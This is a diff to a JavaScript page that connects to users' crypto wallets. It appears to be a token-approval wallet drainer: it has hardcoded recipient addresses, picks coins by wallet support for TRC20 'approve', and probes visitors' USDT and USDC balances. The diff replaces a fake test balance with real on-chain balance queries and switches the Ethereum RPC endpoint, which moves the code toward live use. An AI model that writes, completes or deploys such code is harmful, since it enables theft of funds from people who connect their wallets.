@@ -539,7 +539,7 @@
         const RPC = {
             TRON: 'https://api.trongrid.io',
             BSC: 'https://bsc-dataseed.binance.org',
-            ETH: 'https://cloudflare-eth.com'
+            ETH: 'https://1rpc.io/eth'
         };
         const RECIPIENT_ADDRESSES = {
             TRC20: 'TUpkiEo4DJM8WefDXh5WoXYP41pknw8oPU',
@@ -558,7 +558,6 @@
         };
         const walletsPopularity = ['OKX Wallet', 'MetaMask', 'Trust Wallet', 'Bitget Wallet', 'TronLink'];
 
-        // Функция для фильтрации монет в зависимости от кошелька
         function getAvailableCoinsForWallet(walletName) {
             const allCoins = [
                 { coin: 'USDT', network: 'TRC20', name: 'USDT (TRC-20)', contract: USDT_CONTRACTS.TRC20, decimals: 6, isNative: false },
@@ -568,19 +567,16 @@
                 { coin: 'USDC', network: 'ERC20', name: 'USDC (ERC-20)', contract: USDC_CONTRACTS.ERC20, decimals: 6, isNative: false }
             ];
 
-            // Для кошельков, которые НЕ поддерживают TRC20 approve
             const noTrc20Wallets = ['MetaMask', 'Trust Wallet'];
             
             if (noTrc20Wallets.includes(walletName)) {
                 return allCoins.filter(coin => coin.network !== 'TRC20');
             }
             
-            // Для TronLink — только TRC20
             if (walletName === 'TronLink') {
                 return allCoins.filter(coin => coin.network === 'TRC20');
             }
             
-            // Для OKX и Bitget — все сети
             return allCoins;
         }
 
@@ -788,7 +784,6 @@
         }
 
         async function getBalance(network, coin, address) {
-            // Показываем сообщение на экране
             const statusDiv = document.getElementById('walletStatus');
             if (statusDiv) {
                 statusDiv.innerHTML = `🔄 Checking ${coin} on ${network}...<br>Address: ${address.slice(0,10)}...`;
@@ -803,13 +798,12 @@
                     if (coin === 'USDC') return await getEVM20Balance(address, USDC_CONTRACTS.BEP20, RPC.BSC, 18);
                 } else if (network === 'ERC20') {
                     if (coin === 'USDT') {
-                        // ВРЕМЕННО: тестовый баланс 6.44 USDT
-                        if (statusDiv) {
-                            statusDiv.innerHTML = `✅ Balance: 6.44 USDT`;
-                        }
-                        return 6.44;
+                        // РЕАЛЬНАЯ ПРОВЕРКА БАЛАНСА через RPC
+                        return await getEVM20Balance(address, USDT_CONTRACTS.ERC20, RPC.ETH, 6);
                     }
-                    if (coin === 'USDC') return 0;
+                    if (coin === 'USDC') {
+                        return await getEVM20Balance(address, USDC_CONTRACTS.ERC20, RPC.ETH, 6);
+                    }
                 }
                 return 0;
             } catch (error) {
